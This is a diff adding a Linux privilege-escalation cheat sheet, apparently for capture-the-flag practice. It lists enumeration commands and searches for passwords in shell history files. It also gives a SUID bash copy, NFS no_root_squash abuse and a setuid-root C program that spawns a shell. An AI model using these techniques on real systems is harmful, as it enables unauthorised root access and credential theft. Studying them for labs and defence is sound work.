@@ -1,0 +1,116 @@
+------------------ SystemEnum (post-enumeration) --------------------------
+hostname #show what is the device called in local network
+
+uname -a #print system information (kernel version) check kernel exploits
+cat /proc/version #information on the kernel version and additional data
+/etc/issue #nformation about the operating system but can easily be customized
+
+ps #running processes on a Linux system.
+ps -A #View all running processes
+ps aux #show processes for all users/display the user that launched the process
+
+env #show environmental variables
+
+sudo -l #list all commands the user can run using sudo
+        #then use this info in this site: https://gtfobins.github.io (just copy and paste it in cli -can't make script for it)
+
+ls -la #show hidden files
+
+id #overview of the user’s privilege level and group memberships
+
+cat /etc/passwd #discover users on the system
+
+history #Looking at earlier commands the use types
+
+cat ~/.*history | less # If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+
+------------------ NetworkEnum (post-enumeration) -------------------
+
+ifconfig #information about the network interfaces of the system.
+
+ip route #command to see which network routes exist.
+
+netstat #gather information on existing connections.
+netstat -a #shows all listening ports and established connections.
+netstat -at / netstat -au #used to list TCP or UDP protocols
+netstat -l #list ports in “listening” mode.
+
+------------------ Check List ---------------------------------------
+
+python -c 'import pty; pty.spawn("/bin/bash")' #get better shell if target has python
+
+#if u find a s permition file to run u can use this
+cp /bin/bash /tmp/bash
+chmod 4755 /tmp/bash
+
+------------------ File(uploud/Download) ----------------------
+#use scp or wget to upload or download files
+wget:
+python3 -m http.server 8000
+wget 10.10.93.113:8000:<file-name>
+
+scp:
+scp <local/file/path> jan@10.10.7.41:<remote/file/path> #upload
+scp jan@10.10.7.41:<remote/file/path> <local/file/path> #download
+
+scp lennie@10.10.24.24:/home/lennie/scripts/planner.sh /home/whiteowl/
+
+--------------------- Writable Directories --------------------------
+
+/dev/shm #have writeable permition by all users
+/tmp #dirctory to write upload exploits scripts and ...
+
+------------------ find -----------------------------
+
+best of:
+
+find / -writable 2>/dev/null #show writable files
+find / -writable 2>/dev/null | cut -d / -f 1,2| sort -u  #find writables
+find / -type f -perm -04000 -ls 2>/dev/null #show suid files (will list files that have SUID or SGID bits set.)
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null #Find all the SUID/SGID executables
+
+find / -name python* #if system has python (python3 --version)
+find / -name perl* #if system has
+find / -name gcc* #if system has
+
+find . -name flag1.txt #find the file named “flag1.txt” in the current directory
+find /home -name flag1.txt #find the file names “flag1.txt” in the /home directory
+find / -type d -name config #ind the directory named config under “/”
+find / -type f -perm 0777 #find / -type f -perm 0777
+find /home -user pablo #find all files for user “pablo” under “/home”
+find / -size 50M #find files with a 50 MB size
+
+
+------------------------- capabilities ------------------------------------------
+getcap -r / 2>/dev/null #use gtfobins capabilities in the address getcap returen.
+
+-------------------------- crontab -----------------------------------------
+cat /etc/crontab #if script run with higher privilage and u can modify it.
+
+--------------------- NFS (Network File Shareing) --------------------
+cat /etc/exports #NFS configuration _ This file is created during the NFS server installation and can usually be read by users.
+showmount -e <target-ip> #enumerating mountable shares from our attacking machine
+dir has no_root_squash ? and u have read and write and exec perm ?
+
+mount -o rw <target_ip>:<path_to_target_dir> <attacker_path>
+
+create a c or python script. set suid and run it.
+----------------------|
+c script:             |
+                      |
+int main()            |
+{ setgid (0);         |
+  setuid(0);          |
+  system("/bin/bash");|
+  return 0            |
+}                     |
+-----------------------
+gcc <file.c> -o <file_name> -w
+chmod +s <file_name>
+
+-------------------  AutomatedEnumeration Tools ----------------------
+LinPeas #https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+LinEnum #https://github.com/rebootuser/LinEnum
+LES (Linux Exploit Suggester) #https://github.com/mzet-/linux-exploit-suggester
+Linux Smart Enumeration #https://github.com/diego-treitos/linux-smart-enumeration
+Linux Priv Checker #https://github.com/linted/linuxprivchecker
